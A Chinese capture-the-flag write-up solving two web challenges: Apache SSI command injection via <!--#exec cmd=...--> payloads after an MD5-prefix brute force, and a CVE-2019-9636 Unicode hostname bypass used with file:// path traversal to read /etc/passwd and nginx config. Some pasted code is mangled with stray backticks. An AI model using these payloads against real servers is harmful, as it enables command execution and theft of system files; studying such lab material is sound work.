## [BJDCTF2020]EasySearch

### 1.源码查看

### 2.抓包发包

### 3.dirsearch扫描

### 知识点：Apache SSI远程命令执行漏洞

#### **一、漏洞描述**(标志：后缀.stm、.shtm 和 .shtml。)

当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用

##### <!--#exec cmd=”id” -->

语法执行命令。

使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为"服务器端嵌入"或者叫"服务器端包含"，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。



发现index.php.swp源码泄露

![img](https://img2022.cnblogs.com/blog/2834847/202207/2834847-20220720220927628-664506527.png)

分析源代码发现password进行md5加密后前六位需要与'6d0bc1'相同

脚本：

import hashlib

for i in range(1000000000):
    md5 = hashlib.md5(str(i).encode('utf-8')).hexdigest()
    if md5[0:6] == '6d0bc1':
        print(str(i)+' | '+md5)

密码登录：发现发包回来的时候有一个url登进去发现是hello，（盲猜是名字，username）

可以猜一波是ssti

{{2*2}}可以发现是没有4的但是是{{2*2}}

不理解，可能是不一定4就是ssti吧

此处的问题的注入方式为：

<!--#exec cmd="命令" -->

<!--#exec cmd="whoami"-->

<!--#exec cmd="ls"-->

<!--#exec cmd="ls ../"-->

<!--#exec cmd="cat /flag"-->

神奇：没见过   完毕@！！下一题



## [SUCTF 2019]Pythonginx 1

### 知识点

- CVE-2019-9636：urlsplit不处理NFKC标准化
- nginx重要文件的位置
- url中的unicode漏洞引发的域名安全问题（19年black hat中的一个议题）
- 跑python脚本（逃~。。。。）

首先我们需要知道nginx重要文件的位置：

配置文件存放目录：/etc/nginx
主配置文件：/etc/nginx/conf/nginx.conf
管理脚本：/usr/lib64/systemd/system/nginx.service
模块：/usr/lisb64/nginx/modules
应用程序：/usr/sbin/nginx
程序默认存放位置：/usr/share/nginx/html
日志默认存放位置：/var/log/nginx
配置文件目录为：/usr/local/nginx/conf/nginx.conf@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"


    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host


    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
#### 简单来说，需要逃脱前两个if，成功进入第三个if。

而三个if中判断条件都是相同的，不过在此之前的host构造却是不同的，这也是blackhat该议题中想要说明的一点

脚本：

```
from` `urllib.parse ``import` `urlparse,urlunsplit,urlsplit
from` `urllib ``import` `parse
def` `get_unicode():
  ``for` `x ``in` `range``(``65536``):
    ``uni``=``chr``(x)
    ``url``=``"http://suctf.c{}"``.``format``(uni)
    ``try``:
      ``if` `getUrl(url):
        ``print``(``"str: "``+``uni``+``' unicode: \\u'``+``str``(``hex``(x))[``2``:])
    ``except``:
      ``pass
```

 

```
def` `getUrl(url):
  ``url``=``url
  ``host``=``parse.urlparse(url).hostname
  ``if` `host ``=``=` `'suctf.cc'``:
    ``return` `False
  ``parts``=``list``(urlsplit(url))
  ``host``=``parts[``1``]
  ``if` `host ``=``=` `'suctf.cc'``:
    ``return` `False
  ``newhost``=``[]
  ``for` `h ``in` `host.split(``'.'``):
    ``newhost.append(h.encode(``'idna'``).decode(``'utf-8'``))
  ``parts[``1``]``=``'.'``.join(newhost)
  ``finalUrl``=``urlunsplit(parts).split(``' '``)[``0``]
  ``host``=``parse.urlparse(finalUrl).hostname
  ``if` `host ``=``=` `'suctf.cc'``:
    ``return` `True
  ``else``:
    ``return` `False 
```

```
if` `__name__``=``=``'__main__'``:
  ``get_unicode()
```

#### 我们只需要用其中任意一个去读取文件就可以了

比如：http://29606583-b54e-4b3f-8be0-395c977bfe1e.node3.buuoj.cn/getUrl?url=file://suctf.c%E2%84%82/../../../../../etc/passwd

先读一下etc/passwd

[![img](https://img2018.cnblogs.com/i-beta/1828215/202001/1828215-20200113143230558-1820695663.png)](https://img2018.cnblogs.com/i-beta/1828215/202001/1828215-20200113143230558-1820695663.png)

 

####  题目提示我们是nginx，所以我们去读取nginx的配置文件

这里读的路径是 /usr/local/nginx/conf/nginx.conf

http://29606583-b54e-4b3f-8be0-395c977bfe1e.node3.buuoj.cn/getUrl?url=file://suctf.c%E2%84%82/../../../../..//usr/local/nginx/conf/nginx.conf

看到有：

[![img](https://img2018.cnblogs.com/i-beta/1828215/202001/1828215-20200113143803189-1172498224.png)](https://img2018.cnblogs.com/i-beta/1828215/202001/1828215-20200113143803189-1172498224.png)

 

于是访问http://29606583-b54e-4b3f-8be0-395c977bfe1e.node3.buuoj.cn/getUrl?url=file://suctf.c%E2%84%82/../../../../..//usr/fffffflag

得到flag

[![img](https://img2018.cnblogs.com/i-beta/1828215/202001/1828215-20200113143859526-1498810239.png)](https://img2018.cnblogs.com/i-beta/1828215/202001/1828215-20200113143859526-1498810239.png)

贴上另外部分nginx的配置文件所在位置

```
配置文件存放目录：``/``etc``/``nginx``主配置文件：``/``etc``/``nginx``/``conf``/``nginx.conf``管理脚本：``/``usr``/``lib64``/``systemd``/``system``/``nginx.service``模块：``/``usr``/``lisb64``/``nginx``/``modules``应用程序：``/``usr``/``sbin``/``nginx``程序默认存放位置：``/``usr``/``share``/``nginx``/``html``日志默认存放位置：``/``var``/``log``/``nginx
```

# 抽象（）